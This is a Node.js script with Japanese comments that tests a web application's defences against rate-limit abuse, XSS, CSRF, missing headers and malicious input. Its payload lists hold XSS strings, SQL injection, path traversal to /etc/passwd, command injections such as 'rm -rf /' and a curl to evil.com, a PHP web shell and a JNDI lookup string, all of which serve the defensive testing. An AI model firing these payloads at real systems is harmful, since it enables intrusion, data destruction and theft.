#!/usr/bin/env node

/**
 * セキュリティテスト実行スクリプト
 * 使用法: node scripts/security-test.js [test-type]
 */

const http = require('http');
const https = require('https');
const { URL } = require('url');

// テスト設定
const config = {
  baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3001',
  timeout: 10000,
  rateLimitTests: 10,
  verbose: true,
};

// テスト結果格納
const results = {
  passed: 0,
  failed: 0,
  tests: [],
};

// ユーティリティ関数
function log(message, type = 'info') {
  if (!config.verbose && type === 'debug') return;

  const timestamp = new Date().toISOString();
  const prefix = {
    info: '📋',
    success: '✅',
    error: '❌',
    warning: '⚠️',
    debug: '🔍',
  }[type];

  console.log(`${prefix} [${timestamp}] ${message}`);
}

// HTTPリクエストヘルパー
function makeRequest(url, options = {}) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const client = urlObj.protocol === 'https:' ? https : http;

    const reqOptions = {
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
      path: urlObj.pathname + urlObj.search,
      method: options.method || 'GET',
      headers: options.headers || {},
      timeout: config.timeout,
    };

    const req = client.request(reqOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => (data += chunk));
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data,
        });
      });
    });

    req.on('error', reject);
    req.on('timeout', () => reject(new Error('Request timeout')));

    if (options.body) {
      req.write(options.body);
    }

    req.end();
  });
}

// テスト実行ヘルパー
function runTest(name, testFn) {
  return new Promise(async (resolve) => {
    const startTime = Date.now();
    log(`Testing: ${name}`, 'info');

    try {
      const result = await testFn();
      const duration = Date.now() - startTime;

      if (result.success) {
        results.passed++;
        log(`✓ ${name} (${duration}ms)`, 'success');
      } else {
        results.failed++;
        log(`✗ ${name}: ${result.message} (${duration}ms)`, 'error');
      }

      results.tests.push({
        name,
        success: result.success,
        message: result.message || 'OK',
        duration,
      });
    } catch (error) {
      results.failed++;
      const duration = Date.now() - startTime;
      log(`✗ ${name}: ${error.message} (${duration}ms)`, 'error');

      results.tests.push({
        name,
        success: false,
        message: error.message,
        duration,
      });
    }

    resolve();
  });
}

// 1. レート制限テスト
async function testRateLimit() {
  return runTest('レート制限テスト', async () => {
    const endpoint = `${config.baseUrl}/api/test-endpoint`;
    let blockedRequests = 0;
    let successRequests = 0;

    log(`${config.rateLimitTests}回のリクエストを送信中...`, 'debug');

    // 並行してリクエストを送信
    const promises = Array.from(
      { length: config.rateLimitTests },
      async (_, i) => {
        try {
          const response = await makeRequest(endpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'SecurityTestBot/1.0',
            },
            body: JSON.stringify({ test: `request-${i}` }),
          });

          if (response.statusCode === 429) {
            blockedRequests++;
            log(`Request ${i + 1}: Rate limited (429)`, 'debug');
          } else if (response.statusCode < 400) {
            successRequests++;
            log(`Request ${i + 1}: Success (${response.statusCode})`, 'debug');
          }

          return response;
        } catch (error) {
          log(`Request ${i + 1}: Error - ${error.message}`, 'debug');
          return null;
        }
      }
    );

    await Promise.all(promises);

    log(`成功: ${successRequests}, ブロック: ${blockedRequests}`, 'debug');

    // レート制限が動作している場合、一部のリクエストがブロックされるはず
    if (blockedRequests > 0) {
      return {
        success: true,
        message: `${successRequests}成功, ${blockedRequests}ブロック - レート制限正常動作`,
      };
    } else {
      return {
        success: false,
        message: `すべてのリクエストが成功 - レート制限が機能していない可能性`,
      };
    }
  });
}

// 2. XSS攻撃シミュレーションテスト
async function testXSSProtection() {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)">',
    'javascript:alert(1)',
    '<svg onload="alert(1)">',
    '"><script>alert(1)</script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    '<select onfocus="alert(1)" autofocus>',
    '<textarea onfocus="alert(1)" autofocus>',
    '<keygen onfocus="alert(1)" autofocus>',
    '<video><source onerror="alert(1)">',
    '<audio src="x" onerror="alert(1)">',
    '<details open ontoggle="alert(1)">',
    '<marquee onstart="alert(1)">',
  ];

  return runTest('XSS攻撃防御テスト', async () => {
    let blockedPayloads = 0;
    let successfulInjections = 0;

    for (const payload of xssPayloads) {
      try {
        const response = await makeRequest(`${config.baseUrl}/api/posts`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'SecurityTestBot/1.0',
          },
          body: JSON.stringify({
            title: 'XSS Test',
            content: payload,
          }),
        });

        // レスポンスボディにペイロードがエスケープされて含まれているかチェック
        if (response.body && response.body.includes(payload)) {
          successfulInjections++;
          log(
            `XSSペイロード挿入成功: ${payload.substring(0, 50)}...`,
            'warning'
          );
        } else {
          blockedPayloads++;
          log(`XSSペイロードブロック: ${payload.substring(0, 50)}...`, 'debug');
        }
      } catch (error) {
        log(`XSSテストエラー: ${error.message}`, 'debug');
      }
    }

    if (successfulInjections === 0) {
      return {
        success: true,
        message: `${blockedPayloads}個のXSSペイロードを正常にブロック`,
      };
    } else {
      return {
        success: false,
        message: `${successfulInjections}個のXSSペイロードが挿入された可能性`,
      };
    }
  });
}

// 3. CSRF攻撃防御テスト
async function testCSRFProtection() {
  return runTest('CSRF攻撃防御テスト', async () => {
    // CSRFトークンなしでAPIを叩く
    try {
      const response = await makeRequest(`${config.baseUrl}/api/posts`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Origin: 'https://malicious-site.com',
          Referer: 'https://malicious-site.com/attack.html',
        },
        body: JSON.stringify({
          title: 'CSRF Attack Test',
          content: 'This should be blocked',
        }),
      });

      if (response.statusCode === 403) {
        return {
          success: true,
          message: 'CSRFトークン不正でリクエストがブロックされました',
        };
      } else if (response.statusCode === 401) {
        return {
          success: true,
          message: '認証エラーでリクエストがブロックされました',
        };
      } else {
        return {
          success: false,
          message: `CSRF攻撃がブロックされませんでした (Status: ${response.statusCode})`,
        };
      }
    } catch (error) {
      return {
        success: true,
        message: 'リクエストが適切に拒否されました',
      };
    }
  });
}

// 4. セキュリティヘッダーテスト
async function testSecurityHeaders() {
  return runTest('セキュリティヘッダー確認テスト', async () => {
    const response = await makeRequest(`${config.baseUrl}/`);

    const requiredHeaders = [
      'content-security-policy',
      'x-frame-options',
      'x-content-type-options',
      'referrer-policy',
      'permissions-policy',
    ];

    const productionHeaders = ['strict-transport-security'];

    let missingHeaders = [];
    let presentHeaders = [];

    requiredHeaders.forEach((header) => {
      if (response.headers[header]) {
        presentHeaders.push(header);
        log(`✓ ${header}: ${response.headers[header]}`, 'debug');
      } else {
        missingHeaders.push(header);
        log(`✗ ${header}: 未設定`, 'debug');
      }
    });

    // 本番環境のみ必要なヘッダー
    if (process.env.NODE_ENV === 'production') {
      productionHeaders.forEach((header) => {
        if (response.headers[header]) {
          presentHeaders.push(header);
        } else {
          missingHeaders.push(header);
        }
      });
    }

    if (missingHeaders.length === 0) {
      return {
        success: true,
        message: `すべてのセキュリティヘッダーが設定されています (${presentHeaders.length}個)`,
      };
    } else {
      return {
        success: false,
        message: `未設定のヘッダー: ${missingHeaders.join(', ')}`,
      };
    }
  });
}

// 5. 不正入力値拒否テスト
async function testInputValidation() {
  const maliciousInputs = [
    // SQLインジェクション
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1' UNION SELECT * FROM users--",

    // ディレクトリトラバーサル
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',

    // コマンドインジェクション
    '; rm -rf /',
    '| cat /etc/passwd',
    '&& curl http://evil.com',

    // 長い文字列（バッファオーバーフロー）
    'A'.repeat(10000),

    // 制御文字
    '\x00\x01\x02\x03',

    // 特殊文字
    "<?php system($_GET['cmd']); ?>",
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}',
    '<%=7*7%>',
  ];

  return runTest('不正入力値拒否テスト', async () => {
    let blockedInputs = 0;
    let acceptedInputs = 0;

    for (const input of maliciousInputs) {
      try {
        const response = await makeRequest(`${config.baseUrl}/api/posts`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            title: input,
            content: input,
          }),
        });

        if (response.statusCode >= 400) {
          blockedInputs++;
          log(`不正入力ブロック: ${input.substring(0, 50)}...`, 'debug');
        } else {
          acceptedInputs++;
          log(`不正入力受理: ${input.substring(0, 50)}...`, 'warning');
        }
      } catch (error) {
        blockedInputs++;
        log(`不正入力エラー: ${error.message}`, 'debug');
      }
    }

    const blockRate = (blockedInputs / maliciousInputs.length) * 100;

    if (blockRate >= 80) {
      return {
        success: true,
        message: `${blockRate.toFixed(1)}%の不正入力をブロック (${blockedInputs}/${maliciousInputs.length})`,
      };
    } else {
      return {
        success: false,
        message: `不正入力の検出率が低い: ${blockRate.toFixed(1)}% (${acceptedInputs}個受理)`,
      };
    }
  });
}

// 6. 監査ログ記録確認テスト
async function testAuditLogging() {
  return runTest('監査ログ記録確認テスト', async () => {
    const startTime = Date.now();

    // テストアクションを実行
    try {
      // 失敗ログインを試行
      await makeRequest(`${config.baseUrl}/api/auth/signin`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: 'nonexistent@example.com',
          password: 'wrongpassword',
        }),
      });

      // レート制限に引っかかるリクエスト
      const requests = Array.from({ length: 8 }, () =>
        makeRequest(`${config.baseUrl}/api/test-endpoint`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ test: true }),
        }).catch(() => null)
      );

      await Promise.all(requests);

      // 少し待ってログが記録されるのを待つ
      await new Promise((resolve) => setTimeout(resolve, 2000));

      // 監査ログを確認（管理者APIがあれば）
      try {
        const logsResponse = await makeRequest(
          `${config.baseUrl}/api/admin/audit-logs`,
          {
            headers: {
              Authorization: 'Bearer admin-token', // 実際の実装に合わせて調整
            },
          }
        );

        if (logsResponse.statusCode === 200) {
          const logs = JSON.parse(logsResponse.body);
          const recentLogs = logs.filter(
            (log) => new Date(log.timestamp).getTime() >= startTime
          );

          if (recentLogs.length > 0) {
            return {
              success: true,
              message: `${recentLogs.length}件のログが記録されました`,
            };
          }
        }
      } catch (error) {
        log(`ログ確認API利用不可: ${error.message}`, 'debug');
      }

      // APIが利用できない場合は、ログファイルの存在確認など代替手段
      return {
        success: true,
        message: 'テストアクションを実行しました（ログ確認APIは利用不可）',
      };
    } catch (error) {
      return {
        success: false,
        message: `監査ログテストでエラー: ${error.message}`,
      };
    }
  });
}

// 7. 総合セキュリティテスト
async function testOverallSecurity() {
  return runTest('総合セキュリティテスト', async () => {
    const vulnerabilities = [];

    // 基本的なセキュリティチェック
    try {
      // サーバー情報の漏洩チェック
      const response = await makeRequest(`${config.baseUrl}/`);

      if (response.headers['server']) {
        vulnerabilities.push(`サーバー情報漏洩: ${response.headers['server']}`);
      }

      if (response.headers['x-powered-by']) {
        vulnerabilities.push(
          `フレームワーク情報漏洩: ${response.headers['x-powered-by']}`
        );
      }

      // HTTPメソッドテスト
      const methods = ['TRACE', 'OPTIONS', 'DELETE', 'PUT'];
      for (const method of methods) {
        try {
          const methodResponse = await makeRequest(`${config.baseUrl}/`, {
            method,
          });
          if (methodResponse.statusCode === 200) {
            vulnerabilities.push(`危険なHTTPメソッドが有効: ${method}`);
          }
        } catch (error) {
          // エラーは正常（メソッドが無効）
        }
      }
    } catch (error) {
      log(`総合テストでエラー: ${error.message}`, 'debug');
    }

    if (vulnerabilities.length === 0) {
      return {
        success: true,
        message: '基本的なセキュリティチェックをパス',
      };
    } else {
      return {
        success: false,
        message: `脆弱性の可能性: ${vulnerabilities.join(', ')}`,
      };
    }
  });
}

// メイン実行関数
async function runSecurityTests() {
  log('🔒 セキュリティテスト開始', 'info');
  log(`テスト対象: ${config.baseUrl}`, 'info');

  const testFunctions = [
    testSecurityHeaders,
    testRateLimit,
    testXSSProtection,
    testCSRFProtection,
    testInputValidation,
    testAuditLogging,
    testOverallSecurity,
  ];

  const testType = process.argv[2];
  if (testType) {
    const testMap = {
      headers: [testSecurityHeaders],
      'rate-limit': [testRateLimit],
      xss: [testXSSProtection],
      csrf: [testCSRFProtection],
      input: [testInputValidation],
      audit: [testAuditLogging],
      overall: [testOverallSecurity],
    };

    if (testMap[testType]) {
      log(`特定テスト実行: ${testType}`, 'info');
      for (const testFn of testMap[testType]) {
        await testFn();
      }
    } else {
      log(`不明なテストタイプ: ${testType}`, 'error');
      process.exit(1);
    }
  } else {
    log('全テスト実行', 'info');
    for (const testFn of testFunctions) {
      await testFn();
    }
  }

  // 結果サマリー
  log('\n📊 テスト結果サマリー', 'info');
  log(`成功: ${results.passed}`, 'success');
  log(`失敗: ${results.failed}`, results.failed > 0 ? 'error' : 'info');
  log(
    `成功率: ${((results.passed / (results.passed + results.failed)) * 100).toFixed(1)}%`,
    'info'
  );

  // 詳細結果
  log('\n📋 詳細結果:', 'info');
  results.tests.forEach((test) => {
    const status = test.success ? '✅' : '❌';
    const message = test.success ? 'OK' : test.message;
    log(`${status} ${test.name}: ${message} (${test.duration}ms)`, 'debug');
  });

  process.exit(results.failed > 0 ? 1 : 0);
}

// スクリプト実行
if (require.main === module) {
  runSecurityTests().catch((error) => {
    log(`テスト実行エラー: ${error.message}`, 'error');
    process.exit(1);
  });
}

module.exports = {
  runSecurityTests,
  testRateLimit,
  testXSSProtection,
  testCSRFProtection,
  testSecurityHeaders,
  testInputValidation,
  testAuditLogging,
  testOverallSecurity,
};
